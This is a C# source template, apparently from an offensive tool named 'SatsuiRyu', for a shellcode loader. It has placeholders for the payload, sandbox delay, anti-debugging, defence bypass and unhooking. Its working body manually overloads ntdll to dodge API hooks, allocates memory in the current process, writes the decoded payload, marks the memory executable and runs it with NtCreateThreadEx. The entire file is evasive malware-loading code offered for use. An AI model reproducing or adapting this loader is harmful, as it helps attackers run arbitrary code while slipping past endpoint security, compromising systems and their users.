using System;
using System.Diagnostics;
using System.Linq;
using System.Collections.Generic;
using System.Runtime.InteropServices;
//####USING####


namespace SatsuiRyu
{

    //####CODE####

    public static class SatsuiRyu
    {

        public static void Main(string[] args)
        {
            //####DELAY####

            //####ANTIDEBUG####

            //####BYPASS####

            //####UNHOOK####

            var encoded = ####SHELLCODE####;

            //####CALL####

            DLL ntdll = new DLL("C:\\Windows\\System32\\ntdll.dll");
            IntPtr pHandle = IntPtr.Zero;
            IntPtr memAlloc = IntPtr.Zero;
            IntPtr zeroBits = IntPtr.Zero;
            IntPtr size = (IntPtr)decoded.Length;
            IntPtr pThread = IntPtr.Zero;
            IntPtr buffer = Marshal.AllocHGlobal(decoded.Length);
            uint bytesWritten = 0;
            uint oldProtect = 0;
            Marshal.Copy(decoded, 0, buffer, decoded.Length);

            DInvoke.Data.Native.OBJECT_ATTRIBUTES oa = new DInvoke.Data.Native.OBJECT_ATTRIBUTES();

            IntPtr targetPid = (IntPtr)Process.GetCurrentProcess().Id;

            DInvoke.Data.Native.CLIENT_ID ci = new DInvoke.Data.Native.CLIENT_ID
            {
                UniqueProcess = targetPid
            };

            uint status = 0;
            // NtOpenProcess
            Console.WriteLine("[*] Getting Handle to {0}", targetPid);
            object[] ntOpenProcessArgs = {
                pHandle,
                DInvoke.Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS,
                oa,
                ci
            };
            status = ntdll.ChaseFunction("NtOpenProcess", typeof(DynamicInvoke.Native.DELEGATES.NtOpenProcess), ntOpenProcessArgs);
            pHandle = (IntPtr)ntOpenProcessArgs[0];

            ntdll.CheckNullPtr(pHandle, "[-] Failed to get process handle");

            // NtAllocateVirtualMemory
            Console.WriteLine("[*] Allocating {0} bytes of memory", decoded.Length);
            object[] allocateVirtualMemoryParams = {
                pHandle,
                memAlloc,
                zeroBits,
                size,
                DInvoke.Data.Win32.Kernel32.MEM_COMMIT | DInvoke.Data.Win32.Kernel32.MEM_RESERVE,
                (uint)0x04
            };
            status = ntdll.ChaseFunction("NtAllocateVirtualMemory",
                                         typeof(DynamicInvoke.Native.DELEGATES.NtAllocateVirtualMemory),
                                         allocateVirtualMemoryParams);

            memAlloc = (IntPtr)allocateVirtualMemoryParams[1];
            size = (IntPtr)allocateVirtualMemoryParams[3];

            ntdll.CheckNullPtr(memAlloc, "[-] Failed to allocate memory");

            // NtWriteVirtualMemory
            Console.WriteLine("[*] Writing payload into memory");
            object[] writeVirtualMemoryParams = {
                pHandle,
                memAlloc,
                buffer,
                (uint)decoded.Length,
                bytesWritten
            };
            status = ntdll.ChaseFunction("NtWriteVirtualMemory",
                                         typeof(DynamicInvoke.Native.DELEGATES.NtWriteVirtualMemory),
                                         writeVirtualMemoryParams);

            bytesWritten = (uint)writeVirtualMemoryParams[4];

            // NtProtectVirtualMemory
            object[] protectVirtualMemoryParams = { pHandle, memAlloc, size, (uint)0x20, oldProtect };
            status = ntdll.ChaseFunction("NtProtectVirtualMemory",
                                         typeof(DynamicInvoke.Native.DELEGATES.NtProtectVirtualMemory),
                                         protectVirtualMemoryParams);


            memAlloc = (IntPtr)protectVirtualMemoryParams[1];
            size = (IntPtr)protectVirtualMemoryParams[2];
            oldProtect = (uint)protectVirtualMemoryParams[4];

            // NtCreateThreadEx
            Console.WriteLine("[*] Creating Thread");
            object[] createThreadParams = {
                pThread,
                DInvoke.Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED,
                IntPtr.Zero,
                pHandle,
                memAlloc,
                IntPtr.Zero,
                false,
                0,
                0,
                0,
                IntPtr.Zero
            };
            status = ntdll.ChaseFunction("NtCreateThreadEx",
                                         typeof(DynamicInvoke.Native.DELEGATES.NtCreateThreadEx),
                                         createThreadParams);
            pThread = (IntPtr)createThreadParams[0];
            ntdll.CheckNullPtr(pThread, "[-] Failed to start thread");

            object[] waitForSingleObjectParams = {
                pThread,
                false,
                0xFFFFFFFF
            };

            status =  ntdll.ChaseFunction("NtWaitForSingleObject",
                                         typeof(NtWaitForSingleObject),
                                         waitForSingleObjectParams);

        }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 NtWaitForSingleObject(
            IntPtr ObjectHandle,
            bool Alertable,
            uint Timeout);


        internal class DLL
        {

            public DInvoke.Data.PE.PE_MANUAL_MAP dll;

            public uint ChaseFunction(string fname, Type ftype, object[] args)
            {
                return (uint)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(this.dll.PEINFO,
                                                                                    this.dll.ModuleBase,
                                                                                    fname,
                                                                                    ftype,
                                                                                    args,
                                                                                    false);
            }

            public DLL(string path)
            {
                this.dll = new DInvoke.Data.PE.PE_MANUAL_MAP();
                //this.dll = DInvoke.ManualMap.Map.MapModuleToMemory(path);
                this.dll = DInvoke.ManualMap.Overload.OverloadModule(path);
            }


            public void CheckNull(object test, string label) {
                if (test == null) {
                    Console.WriteLine("Error: {0} is null", label);
                    Environment.Exit(1);
                }
            }
            public void CheckNullPtr(IntPtr test, string label) {
                if (test == IntPtr.Zero) {
                    Console.WriteLine("[-] Error: {0} is IntPtr.Zero", label);
                    Environment.Exit(1);
                }
            }

        }
    }
}